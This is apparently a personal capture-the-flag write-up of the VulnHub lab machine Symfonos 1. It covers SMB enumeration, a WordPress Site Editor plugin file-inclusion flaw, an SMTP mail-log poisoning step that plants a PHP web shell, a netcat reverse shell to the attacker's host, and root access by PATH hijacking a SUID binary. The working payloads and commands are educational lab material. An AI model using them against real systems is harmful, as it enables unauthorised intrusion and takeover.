---
{"dg-publish":true,"permalink":"/write-ups/vuln-hub/symfonos-1/","tags":["CTF","write-up"]}
---


![Pasted image 20241206103149.png](/img/user/attachments/Pasted%20image%2020241206103149.png)

---
> [!INFO] Info about Symfonos - 1
>  Beginner real life based machine designed to teach a interesting way of obtaining a low priv shell. SHOULD work for both VMware and Virtualbox.
>  - Name: symfonos: 1
>  - Difficulty: Beginner
>  - Tested: VMware Workstation 15 Pro & VirtualBox 6.0
>  - DHCP service: Enabled
>  - IP address: Automatically assign
> 
> Note: You may need to update your host file for `symfonos.local`

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux, Debian 10
## Port 22 - SSH
*OpenSSH 7.4p1* Debian 10+deb9u6 (protocol 2.0)
Service Info: Host: *symfonos.localdomain*
## Port 25 - SMTP
Service: smtp
Version: **Postfix smtpd**
smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
## Port 139 - Netbios
Netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
## Port 445 - SAMBA
netbios-ssn **Samba smbd 4.5.16**-Debian (workgroup: WORKGROUP)
Service Info: Host: **symfonos.localdomain**

smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: **symfonos**
|   NetBIOS computer name: **SYMFONOS**\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2024-12-06T07:42:48-06:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
nbstat: NetBIOS name: SYMFONOS, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown)
| smb-security-mode:
|   **account_used: guest**
|   authentication_level: user
|   challenge_response: supported
|_  **message_signing: disabled** (dangerous, but default)
### Shares
List shares with *smbmap*
```shell
mbmap -H 192.168.122.73
```
![Pasted image 20241206105525.png](/img/user/attachments/Pasted%20image%2020241206105525.png)
Important, the comment "Helios personal share" suggest that exists an username *helios*

I use *enum4llinux*
```shell
enum4linux 192.168.122.73 -a
```
And confirm the username *helios*
![Pasted image 20241206120303.png](/img/user/attachments/Pasted%20image%2020241206120303.png)

---
## Port 80 - Apache
Apache httpd *2.4.25* ((Debian))
```shell
sudo echo "192.168.122.73 symfonos.vh" | sudo tee -a /etc/hosts
```
![Pasted image 20241206151721.png|500](/img/user/attachments/Pasted%20image%2020241206151721.png)
### Fuzzing
```shell
ffuf -c -t 100 -u http://symfonos.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc all -fc 404 -e .php,.html,.txt
```
I found: *Manual*
### Helios
WordPress **5.2.2**
Access to the subdirectory taken from the exploitation phase of *SAMBA*
![Pasted image 20241206151751.png|400](/img/user/attachments/Pasted%20image%2020241206151751.png)

---
# Exploitation
## Exploiting Samba
### Anonymous
Connect to anonymous with NULL session, and list files available.
```shell
smbclient //192.168.122.73/anonymous -N
dir
```
![Pasted image 20241206110723.png|600](/img/user/attachments/Pasted%20image%2020241206110723.png)
Get the file
```shell
get attention.txt
```
![Pasted image 20241206110806.png](/img/user/attachments/Pasted%20image%2020241206110806.png)
Exit and read the file
![Pasted image 20241206111146.png](/img/user/attachments/Pasted%20image%2020241206111146.png)
We found important info, possible passwords and a username, take note of this. I create a file with these 3 passwords

Try with the `helios` username and these passwords
```shell
smbmap -H 192.168.122.73 -u helios -p qwerty
```
![Pasted image 20241206122218.png](/img/user/attachments/Pasted%20image%2020241206122218.png)
### helios
Connect to *helios* share and list 
```shell
smbclient //192.168.122.73/helios -U helios --password=qwerty
```
![Pasted image 20241206122602.png](/img/user/attachments/Pasted%20image%2020241206122602.png)
Download all files
```shell
prompt
mget *
```
![Pasted image 20241206122724.png](/img/user/attachments/Pasted%20image%2020241206122724.png)
Check files
*research.txt*
![Pasted image 20241206122933.png](/img/user/attachments/Pasted%20image%2020241206122933.png)
Take note of some name, could be a usernames or passwords.
*todo.txt*
![Pasted image 20241206123010.png](/img/user/attachments/Pasted%20image%2020241206123010.png)
*/h3l105* looks like a subdirectory of the website.
## LFI - Exploiting wordpress
Using *wpscan*  on the site I found a *LFI* on *site editor* plugin
```shell
wpscan --url http://symfonos.local/h3l105/ -e vp --api-token="67htg.........987h8" --plugins-detection aggressive
```
![Pasted image 20241206205116.png](/img/user/attachments/Pasted%20image%2020241206205116.png)
Searching info
![Pasted image 20241206205356.png](/img/user/attachments/Pasted%20image%2020241206205356.png)
It works, the interesting user for us is *helios* and *root*
![Pasted image 20241206205552.png](/img/user/attachments/Pasted%20image%2020241206205552.png)
## LFI to RCE
To get en *RCE* from *LFI* we need to put or upload a file (Like a php shell) to the system, since via the web server dont looks posible. I will do it via **SMTP** with a email

Connect
```shell
nc 192.168.122.73 25
```

Send the email
```shell
MAIL FROM: Ge0
RCPT TO: Helios
DATA
<?php echo system($_GET['cmd']); ?>
.
```
![Pasted image 20241206210047.png](/img/user/attachments/Pasted%20image%2020241206210047.png)
Using *LFI* check the file `/var/mail/helios`
```shell
view-source:http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios
```
![Pasted image 20241208090918.png](/img/user/attachments/Pasted%20image%2020241208090918.png)
That means the email was sent correctly buy we are not sure if the payload was stored succesfully
Check if we can execute commands *RCE* with the command `whoami`
```shell
view-source:http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=whoami
```
![Pasted image 20241208091333.png](/img/user/attachments/Pasted%20image%2020241208091333.png)
It works
Now we can get a reverse shell

Start the listener
```shell
lrwrap nc -lnvp 4747
```

Execute the code
```
view-source:http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=nc+192.168.122.192+4747+-e+/bin/bash
```

We have the shell as *helios*
![Pasted image 20241208091803.png](/img/user/attachments/Pasted%20image%2020241208091803.png)
Optionally we can [[Notes/Upgrading shell\|Upgrading shell]]

---
# Privilege escalation
## SUID and PATH hijacking
Looking for *SUID* files, I found an interesting uncommon binary
```shell
find / -type f -perm -4000 -ls 2>/dev/null
```
![Pasted image 20241210080144.png](/img/user/attachments/Pasted%20image%2020241210080144.png)
This binary executes curl 
![Pasted image 20241210080251.png](/img/user/attachments/Pasted%20image%2020241210080251.png)
Checking the code, it is executing code without using the complete path.
```shell
strings /opt/statuscheck
```
![Pasted image 20241210080503.png](/img/user/attachments/Pasted%20image%2020241210080503.png)
We can exploit this failure
Create an executable file name *curl* on the *tmp* folder that content the code that we want to execute, in this case `/bin/bash -p`
```shell
echo "/bin/bash -p" > /tmp/curl; ; chmod +x /tmp/curl
```
Change the PATH to point first the */tmp* folder
```shell
export PATH=/tmp:$PATH
```
Execute the binary and get the root shell
```shell
/opt/statuscheck
```
![Pasted image 20241210081027.png](/img/user/attachments/Pasted%20image%2020241210081027.png)

> [!check] Root flag
> ![Pasted image 20241210081148.png](/img/user/attachments/Pasted%20image%2020241210081148.png)

---